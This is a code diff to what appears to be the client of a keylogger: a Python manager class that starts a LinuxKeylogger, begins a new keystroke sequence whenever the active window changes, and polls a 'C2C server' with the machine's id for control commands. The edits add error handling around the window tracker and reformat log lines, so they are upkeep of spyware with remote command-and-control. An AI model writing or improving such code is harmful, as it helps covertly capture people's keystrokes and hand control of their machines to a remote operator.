@@ -59,10 +59,14 @@ class DefaultManager:
         else:
             klogger: Listener = LinuxKeylogger()
             # Start a new sequence when the active window changes
-            self.window_tracker = WindowTracker(
-                # use lambda to call the start_new_sequence method with the window title
-                lambda w: klogger.start_new_sequence(w.title)
-            )
+            try:
+                self.window_tracker = WindowTracker(
+                    # use lambda to call the start_new_sequence method with the window title
+                    lambda w: klogger.start_new_sequence(w.title)
+                )
+            except Exception as e:
+                logger.error("Failed to create the WindowTracker", e)
+                self.window_tracker = None
 
         self.processor = Processor("")
         self.endpoint = endpoint
@@ -184,9 +188,7 @@ class DefaultManager:
                 params={"last": last, "machine_id": self.machine_id},
             )
         except requests.exceptions.ConnectionError as e:
-            logger.error(
-                f"Failed to connect to the C2C server: {self.endpoint}", e
-            )
+            logger.error(f"Failed to connect to the C2C server: {self.endpoint}", e)
             return
         except requests.exceptions.RequestException as e:
             logger.error(
@@ -204,7 +206,6 @@ class DefaultManager:
             )
             return "exit"
 
-        logger.debug(
-            f"Received control command: {resp.json().get('ctrl', '')}")
+        logger.debug(f"Received control command: {resp.json().get('ctrl', '')}")
 
         return resp.json().get("ctrl", "")
